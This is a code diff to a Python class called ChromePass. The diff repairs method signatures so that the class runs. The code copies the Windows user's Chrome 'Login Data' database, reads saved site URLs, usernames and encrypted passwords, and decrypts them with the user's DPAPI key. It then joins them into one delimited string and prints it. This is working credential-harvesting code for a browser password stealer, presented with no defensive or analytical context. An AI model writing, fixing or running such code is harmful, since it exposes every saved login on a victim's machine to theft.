@@ -19,7 +19,7 @@ class ChromePass:
         """
         self.chromepass_filename = chromepass_filename
 
-    def get_key() -> str:
+    def get_key(self) -> str:
         """
         Gets the key to decrypt the chrome data
         """
@@ -31,7 +31,7 @@ class ChromePass:
         key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
         return key
 
-    def decrypt(raw_encrypted, key: str) -> str:
+    def decrypt(self, raw_encrypted, key: str) -> str:
         """
         Decrypts the data from chrome
 
@@ -55,14 +55,14 @@ class ChromePass:
 
         login_data = ""
         path = r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"%(os.environ['USERPROFILE'])
-        key = get_key()
+        key = self.get_key()
         shutil.copy2(path, "logindata.db") 
         conn = sqlite3.connect("logindata.db")
         cursor = conn.cursor()
         cursor.execute("SELECT action_url, username_value, password_value FROM logins")
         for tuple in cursor.fetchall():
             if (tuple[0] != "" and tuple[1] != "" and tuple[2] != ""):
-                login_data += tuple[0] + "," + tuple[1] + "," + decrypt(tuple[2], key) + "|||"
+                login_data += tuple[0] + "," + tuple[1] + "," + self.decrypt(tuple[2], key) + "|||"
         print(login_data)
         cursor.close()
         conn.close()
